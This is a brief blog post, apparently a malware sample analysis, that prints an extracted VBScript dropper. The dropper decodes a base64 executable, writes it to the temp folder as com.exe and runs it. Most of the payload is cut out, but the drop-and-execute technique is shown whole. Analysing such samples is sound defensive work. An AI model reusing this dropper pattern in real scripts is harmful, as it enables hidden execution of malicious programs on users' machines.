---
layout: post
title: DOS-Obfuscation was attempted
published: true
---

> Sample Analysis of March


## Testing markdown for post.



Extracted code:
```javascript
Option Explicit
dim D,E,b,p
Set D=CreateObject("Microsoft.XMLDOM")
Set E=D.createElement("t")
E.DataType="bin.base64"
E.Text="TVqQAAMA.........AA="
Set b=CreateObject("ADODB.Stream")
Set p=CreateObject("Scripting.FileSystemObject").GetSpecialFolder(2)
b.Type=1
b.Open
b.Write E.NodeTypedValue
b.SaveToFile p+"\com.exe",2
CreateObject("WScript.Shell").Run p+"\com.exe"
```
-Removed most of base64 to be able to read it clearly

